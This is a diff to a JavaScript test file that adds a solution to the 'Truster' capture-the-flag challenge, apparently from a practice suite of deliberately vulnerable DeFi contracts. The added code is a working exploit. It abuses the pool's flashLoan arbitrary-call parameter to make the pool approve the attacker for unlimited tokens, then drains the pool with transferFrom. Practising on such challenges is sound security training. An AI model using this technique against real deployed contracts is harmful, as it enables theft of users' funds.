@@ -29,6 +29,13 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        let ABI = ['function approve(address _spender, uint256 _amount)'];
+        let iface = new ethers.utils.Interface(ABI);
+        let callData = iface.encodeFunctionData('approve', [attacker.address, ethers.constants.MaxUint256]);
+        // TrustLenderPool contract approving the attacker to spend UINT_MAX DVT tokens
+        this.pool.connect(attacker).flashLoan('0', attacker.address, this.token.address, callData);
+        // attacker transfers 1m DVT from TrustLenderPool to itself
+        this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
